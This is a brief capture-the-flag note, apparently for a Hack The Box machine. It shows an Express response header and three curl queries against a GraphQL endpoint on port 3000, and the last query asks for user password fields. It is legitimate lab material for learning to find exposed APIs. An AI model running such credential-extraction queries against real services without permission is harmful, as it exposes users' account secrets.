# GraphQL

Port 3000

X-Powered-By: Express

```
Response headers (155 B)

HTTP/1.1 304 Not Modified
X-Powered-By: Express
ETag: W/"51-gr8XZ5dns fHNaB2KgX/Gxm9yVZU
Date: Thu, 09 May 2019 02:41:53 GMT
Connection: keep-alive
```

{% code overflow="wrap" %}
```bash
curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}" | jq
```
{% endcode %}

{% code overflow="wrap" %}
```bash
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq
```
{% endcode %}

{% code overflow="wrap" %}
```bash
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username,password} }' | jq
```
{% endcode %}
